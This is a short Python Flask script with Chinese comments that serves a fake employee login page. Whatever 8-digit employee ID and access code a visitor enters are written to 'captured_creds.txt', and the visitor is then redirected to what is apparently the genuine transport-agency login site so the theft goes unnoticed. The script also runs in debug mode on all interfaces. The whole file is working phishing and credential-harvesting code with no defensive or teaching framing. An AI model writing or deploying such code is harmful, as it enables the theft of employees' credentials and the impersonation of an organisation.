from flask import Flask, request, render_template, redirect

app = Flask(__name__)


@app.route("/")
def index():
    return redirect("/login")


@app.route("/login", methods=["POST", "GET"])
def login():
    error = None
    if request.method == 'POST':
        employee_id = request.form.get("employee_id")
        access_code = request.form.get("access_code")

        # 严格验证逻辑
        if not employee_id or not employee_id.isdigit() or len(employee_id) != 8:
            error = "Please enter a valid 8-digit ID"
        else:
            with open("captured_creds.txt", "a") as f:
                f.write(f"{employee_id}:{access_code}\n")
            return redirect("https://legit-transport-gov.com/login", code=302)

    return render_template('login.html', error=error)


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8888, debug=True)  # 开启调试模式